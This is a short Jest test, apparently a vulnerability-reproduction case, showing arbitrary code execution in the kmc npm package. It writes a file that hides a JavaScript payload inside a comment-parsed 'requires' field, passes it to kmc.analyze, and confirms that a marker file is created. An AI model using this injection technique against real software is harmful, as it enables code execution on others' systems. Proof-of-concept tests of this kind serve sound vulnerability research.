//
test("Arbitrary code execution in kmc", () => {
  const fs = require("fs");
  let kmc = require("kmc/lib"); // no idea how to get to this file otherwise
  const path = "./kmc";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  fs.writeFileSync(
    "./exploit.js",
    "//{requires:[require('fs').writeFileSync('kmc','')]});"
  );
  try {
    kmc.analyze("./exploit.js");
  } catch (e) {}
  fs.unlinkSync("./exploit.js");

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
